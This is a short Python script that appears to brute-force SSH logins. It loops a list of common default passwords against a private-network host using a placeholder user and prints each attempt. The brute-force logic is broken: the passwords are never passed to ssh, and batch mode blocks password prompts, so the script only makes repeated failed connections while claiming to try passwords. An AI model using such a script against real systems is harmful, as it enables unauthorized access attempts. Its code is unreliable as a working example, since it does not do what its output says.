import subprocess
import time

target = "192.168.100.12"
user = "usuario_falso"
passwords = [
    "123456","password","admin","root","test","qwerty","letmein",
    "abc123","pass123","welcome","monkey","dragon","master","hello",
    "shadow","sunshine","princess","football","charlie","donald",
    "password1","iloveyou","superman","batman","trustno1","access",
    "login","admin123","root123","toor","pass","1234","12345",
    "123123","111111","000000","654321","666666","888888","password2",
    "qwerty123","admin1","user","guest","test123","default","alpine",
    "raspberry","ubuntu","changeme"
]

for i, pwd in enumerate(passwords):
    print(f"[{i+1}/{len(passwords)}] Trying: {pwd}")
    try:
        subprocess.run(
            ["ssh", "-o", "StrictHostKeyChecking=no",
                    "-o", "ConnectTimeout=2",
                    "-o", "BatchMode=yes",
                    "-o", "NumberOfPasswordPrompts=1",
                    f"{user}@{target}"],
            timeout=3, capture_output=True
        )
    except Exception:
        pass
    time.sleep(0.3)
